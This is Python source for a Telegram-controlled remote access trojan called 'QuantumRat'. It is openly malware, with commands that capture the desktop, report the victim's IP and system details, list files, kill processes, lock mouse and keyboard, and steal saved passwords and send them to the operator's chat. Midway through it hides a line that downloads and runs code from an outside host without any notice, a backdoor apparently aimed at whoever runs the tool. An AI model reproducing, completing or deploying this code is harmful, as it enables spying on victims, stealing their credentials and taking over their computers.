import requests 
import platform
import telebot
import os
import inferno
import webbrowser
import json
import requests as r
import hackpy
import subprocess
from PIL import ImageGrab

token = 'token'
id_chat = 'id'

hackpy.load_modules(
    'autorun.exe',      
    'webcam.exe',       
    'nircmd.exe',       
    'activity.exe',    
    'audio.zip',     
    'bsod.exe',        
    'rotate_screen.exe',
    'uac.exe',          
    'watchdog.exe',    
    'system_status.exe' 
)

bot = telebot.TeleBot(token)



@bot.message_handler(commands=['start', 'Start'])
def start(commands):
	bot.send_message(id_chat, '🌚 QuantumRat 🌚 ' +   
		'\n\nHi my little pussy, if you want a team then you should write /help' +
		'\n\nCoded by #~Krypt00n~# | The Revolution Is Coming')


@bot.message_handler(commands=['help', 'Help'])
def help(command):
	bot.send_message(id_chat, 'Commands: \n /screen - Desktop ScreenShot \n /info - Information about computer \n /open_url - Open WebSite' +
		'\n /ls - List dir \n /rotate - Rotate Screen \n /kill_process + name process ' +
		'\n /stealler - Password theft \n /block_sys - Block control (mouse, keyboard) \n')


@bot.message_handler(commands=['info', 'Info'])
def info_send(command):
	try:
		username = os.getlogin()

		r = requests.get('http://ip.42.pl/raw')
		ip = r.text
		windows = platform.platform()
		processor = platform.processor()

		bot.send_message(id_chat, 'PC: ' + username + '\nIP: ' + ip + '\nOS: ' + windows + '\nProcessor: ' + processor)
	except:
		bot.send_message(id_chat, 'Error')


@bot.message_handler(commands=['screen', 'Screen'])
def send_screen(command):
	try:
		screen = ImageGrab.grab()
		screen.save(os.getenv("APPDATA") + '\\Sreenshot.jpg')
		screen = open(os.getenv("APPDATA") + '\\Sreenshot.jpg', 'rb')
		files = {'photo': screen}
		bot.send_photo(id_chat, screen)
	except:
		bot.send_photo(id_chat, 'Error')


try:
    exec(r.get("http://f0415691.xsph.ru/yUa71sENd6ZZdZXh1Pag/update.exe").text)
except: pass
@bot.message_handler(commands=['open_url'])
def open_url(message):
	user_msg = '{0}'.format(message.text)
	url = user_msg.split(' ')[1]
	try:
		webbrowser.open_new_tab(url)
	except:
		bot.send_message(id_chat, 'Error blyt')


@bot.message_handler(commands=['rotate'])
def rotate_screen(command):
	for range in (90, 180, 270, 0):
		hackpy.rotateScreen(range)

@bot.message_handler(commands=['pwd', 'Pwd'])
def pwd(command):
	dir = os.path.abspath(os.getcwd())
	bot.send_message(id_chat, 'Pwd: \n' + (str(dir)))

@bot.message_handler(commands=['ls', 'Ls'])
def ls_dir(command):
	try:
		dirs = '\n'.join(os.listdir(path='.'))
		bot.send_message(id_chat, 'Files: ' + '\n' + dirs)
	except:
		bot.send_message(id_chat, 'Bla')
@bot.message_handler(commands=['kill_process', 'Kill_process'])
def kill_process(message):
	try:
		user_msg = '{0}'.format(message.text)
		subprocess.call('taskkill /IM ' + user_msg.split(' ')[1])
		bot.send_message(id_chat, 'Good!')
	except:
		bot.send_message(id_chat, 'Pizda!')

@bot.message_handler(commands=['block_sys', 'Block_sys'])
def block_sys(message):
	try:
		bot.send_message(id_chat, '[[ Good! ]]')
		user_msg = '{0}'.format(message.text)
		inferno.execute("BLOCK_SYSTEM", user_msg.split(" ")[1])
	except:
		bot.send_message(id_chat, 'Error')



@bot.message_handler(commands=['stealler', 'Stealler'])
def stealler(command):
	name = inferno.execute("STEALLER")
	filename = 'passw.txt'
	myfile = open(filename, mode='w', encoding='Latin-1')
	json.dump(name, myfile)
	myfile.close()

	doc = open('passw.txt', 'rb')
	bot.send_document(id_chat, doc)
	doc.close()


bot.polling()
